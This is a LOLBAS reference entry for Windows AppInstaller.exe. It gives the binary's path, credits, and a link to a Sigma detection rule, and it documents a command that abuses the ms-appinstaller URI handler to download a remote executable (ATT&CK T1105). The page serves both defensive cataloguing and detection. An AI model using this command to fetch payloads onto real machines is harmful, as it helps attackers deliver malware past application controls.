---
title: "AppInstaller.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/
fetched_at: 2026-09-20T17:09:17Z
license: unspecified
category: windows
---

Tool used for installation of AppX/MSIX applications on Windows 10

## Paths
- C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe

## Resources
- [https://twitter.com/notwhickey/status/1333900137232523264](https://twitter.com/notwhickey/status/1333900137232523264)

## Acknowledgements
- Wade Hickey ([@notwhickey](https://twitter.com/@notwhickey))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml)

## Download

1. AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.

```
start ms-appinstaller://?source={REMOTEURL:.exe}
```

   - Use case: Download file from Internet

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
